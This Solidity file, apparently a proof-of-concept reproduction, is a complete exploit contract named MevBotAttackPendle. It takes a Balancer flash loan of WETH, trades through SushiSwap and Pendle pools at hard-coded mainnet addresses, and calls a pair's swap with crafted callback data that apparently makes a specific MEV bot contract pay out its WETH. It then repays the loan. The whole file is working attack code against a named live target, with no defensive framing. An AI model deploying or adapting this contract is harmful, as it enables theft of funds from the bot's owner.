//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
pragma abicoder v2;

import './interfaces/IUniswapV2Pair.sol';

import 'hardhat/console.sol';
import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}
interface IBalancerVault {
     function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ISLP {
     function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IPendleRouter {
    function swapExactOut(
        address _tokenIn,
        address _tokenOut,
        uint256 _outAmount,
        uint256 _maxInAmount,
        bytes32 _marketFactoryId
    ) external returns (uint256 inSwapAmount);
}

struct VaultCallBackData {
    address Balancer_Vault_address;
}




contract MevBotAttackPendle is Ownable {

    address public constant Balancer_Vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant WETH_address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant SLP_address = 0x37922C69b08BABcCEaE735A31235c81f1d1e8E43;
    address public constant PendleRouter_address = 0x1b6d3E5Da9004668E14Ca39d1553E9a46Fe842B3;
    address public constant PENDLE_TOKEN_addresss = 0x808507121B80c02388fAd14726482e061B8da827;
    address public constant YT_SLP_29DEC2022_address = 0x49c8aC20dE6409c7e0B8f9867cffD1481D8206c6;

    address public constant SushiSwap_PENDLE_OT_SLP_29DEC2022_address =  0xb124C4e18A282143D362a066736FD60d22393Ef4;


    address public constant MEV_BOT_address = 0x85e5C6cFFD260A7F153B1f34b36F6dBEBA3e279e;

    IERC20 private constant WETH = IERC20(WETH_address);
    IERC20 private constant YT_SLP_29DEC2022 = IERC20(YT_SLP_29DEC2022_address);
    IERC20 private constant PENDLE_TOKEN = IERC20(PENDLE_TOKEN_addresss);
    
    IUniswapV2Pair private constant SushiSwap_PENDLE_OT_SLP_29DEC2022 = IUniswapV2Pair(SushiSwap_PENDLE_OT_SLP_29DEC2022_address);
    IUniswapV2Pair private constant SLP = IUniswapV2Pair(SLP_address);
    
    IPendleRouter private constant PendleRouter = IPendleRouter(PendleRouter_address);
    

    // uint256 private constant borrow_WETH_amt = 3_000_000_000_000_000_000_000; // error ?? why

    function startFlashLoan() public {
        uint256 borrow_WETH_amt = 3_000_000_000_000_000_000_000;
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = borrow_WETH_amt;
        VaultCallBackData memory callBackData;
        callBackData.Balancer_Vault_address = Balancer_Vault;
        bytes memory userData = abi.encode(callBackData);
        IBalancerVault(Balancer_Vault).flashLoan(IFlashLoanRecipient(address(this)), tokens, amounts, userData);
        console.log("Now I have %s WETH ", WETH.balanceOf(address(this)));
    }
    //https://dev.balancer.fi/resources/flash-loans
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        VaultCallBackData memory info = abi.decode(userData,(VaultCallBackData));
        require(msg.sender == info.Balancer_Vault_address);
        require(WETH.balanceOf(address(this)) == amounts[0], "check flash loan");
        

        (uint256 reserve0, uint256 reserve1, uint256 timestamp) = SLP.getReserves(); // 
        console.log("SLP getReserves # 1reserve0 %s, resrve1 %s", reserve0, reserve1);
        WETH.transfer(SLP_address, amounts[0]);
        uint256 swap_amt = 9_143_221_416_380_545_295_906_765;
        
        SLP.swap(swap_amt, 0, address(this), "");
        bytes32 mkfid = 0x47656e6572696300000000000000000000000000000000000000000000000000;

        PendleRouter.swapExactOut(PENDLE_TOKEN_addresss, YT_SLP_29DEC2022_address, 163, swap_amt, mkfid);
        YT_SLP_29DEC2022.transfer(MEV_BOT_address, 163);

        uint256 mev_bot_weth_amt = WETH.balanceOf(MEV_BOT_address);
        console.log("mev_bot_weth_amt %s", mev_bot_weth_amt);
        bytes memory data = "0x000000000000000000000000000000000000000000000079cab7ea8f2bb01430";
        SushiSwap_PENDLE_OT_SLP_29DEC2022.swap(0, 200, MEV_BOT_address, data);


        (reserve0, reserve1, timestamp) = SLP.getReserves();
        console.log("SLP getReserves #2 reserve0 %s, resrve1 %s", reserve0, reserve1);
        PENDLE_TOKEN.transfer(SLP_address, 9_143_221_416_380_545_295_906_765);

        SLP.swap(0, 3_008_182_901_858_643_848_532, address(this), "");

        WETH.transfer(info.Balancer_Vault_address, amounts[0]); // return 
    }
}